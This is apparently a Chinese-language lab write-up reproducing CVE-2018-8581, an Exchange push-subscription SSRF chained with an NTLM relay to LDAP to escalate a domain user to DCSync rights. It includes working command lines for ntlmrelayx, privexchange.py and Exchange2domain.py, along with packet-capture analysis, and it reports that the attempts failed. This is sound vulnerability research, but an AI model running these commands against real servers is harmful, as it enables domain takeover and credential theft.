# CVE-2018-8581

## 一、原理

Exchange服务器的推送订阅接口存在SSRF，它允许为任何用户推送订阅所指定的URL，当Exchange尝试连接用户指定的URL时候，将会用`CredentialCache.DefaultCredentials`方式进行。

其中`CredentialCache.DefaultCredentials`是以最高权限`SYSTEM`权限运行，通过SSRF发送Exchange的最高权限net NTLM给攻击者，注意SSRF回连Attack是以MAIL权限。

+ 攻击1

  在调用接口时候，使用其他用户SID来伪造攻击，从而可以达到收取他人邮件，模拟他人发送邮件。攻击者利用反射攻击回到Exchange服务器去调用接口，这个时候是最高权限的调用。

+ 攻击2

  通过NTLM Relay中`HTTP -> LDAP`协议的转变，进而攻击域控。由于Exchange角色权限具有修改writeDACL权限，可以将普通域用户赋予具有DCSync权限，从而Dump域控中的Hash信息。

## 二、测试环境

windows 2012：域控 192.168.15.161

windows 2012+Exchange 2016： 邮件服务器 192.168.15.158

windows7：攻击机 192.168.15.130

域用户：geroge (也是邮件服务的用户)

## 三、复现-攻击2

### 3.1 攻击机开启服务，进行监听

`python ntlmrelayx.py -t ladp://192.168.15.161 --escalate-user geroge`

![](.\pictures\cve_2018_8581_ntlmrelay1.PNG)

等待邮件服务器回连。

### 3.2 向邮件服务器指定推送订阅的URL

`python privexchange.py -ah 192.168.15.130 192.168.15.158 -u geroge -d park.com`

输入用户口令后得到如下结果

![](.\pictures\cve_2018_8581_ews1.PNG)

脚本运行成功。抓包分析如下：

![](.\pictures\cve_2018_8581_ews2.PNG)

攻击机利用Exchange Web Services(EWS)的推送订阅功能强制Exchange服务器向任意指定的URL进行NTLM认证，这一步由563号数据包完成。在进行推送订阅时，攻击机要向Exchange服务器进行认证（wireshark中563号数据包应该是在562号数据包前的）因此，攻击者需要一个合法的普通用户身份。696号数据包为服务器的响应数据包。

### 3.3 邮件服务器回连攻击机

推送订阅成功后，稍等片刻，攻击机监听程序即收到服务器的回连数据包

![](.\pictures\cve_2018_8581_ntlmrelay2.PNG)

但是连接失败，提示未找到LDAP客户端协议，wireshark抓包分析，

![](.\pictures\cve_2018_8581_ntlmrelay3.PNG)

4187号数据包：邮件服务器回连攻击机；

4189号数据包：攻击机提示邮件服务器使用NTLM进行认证；

4196号数据包：邮件服务器发起NTLM协商；

4202号数据包：攻击机给邮件服务器重定向响应，这里不甚明白，为何如此，使用另外一个利用脚本即可（https://github.com/Ridter/Exchange2domain）。

### 3.4 更换利用脚本

`python Exchange2domain.py -ah 192.168.15.130 -u geroge -d park.com -th 192.168.15.161 192.168.15.158`

![](.\pictures\cve_2018_8581_ntlmrelay4.png)

仍然未能成功，提示在更新ACL（access control list）时发生了错误，抓包分析,

![](.\pictures\cve_2018_8581_ntlmrelay5.png)

ntlm中继成功，攻击机仿冒“PARK\MAIL$”认证成功，然而在修改ACL时权限不够。

![](.\pictures\cve_2018_8581_ntlmrelay6.png)

完整的wireshark数据包(./resources/cve_2018_8581_exchange2domain.pcapng)

## 复现-攻击1

原理类似，利用ntlm中继攻击邮件服务器，同样没有成功。

## 参考资料

[microsoft exchange 漏洞分析][https://0kee.360.cn/blog/microsoft-exchange-cve-2018-8581/]

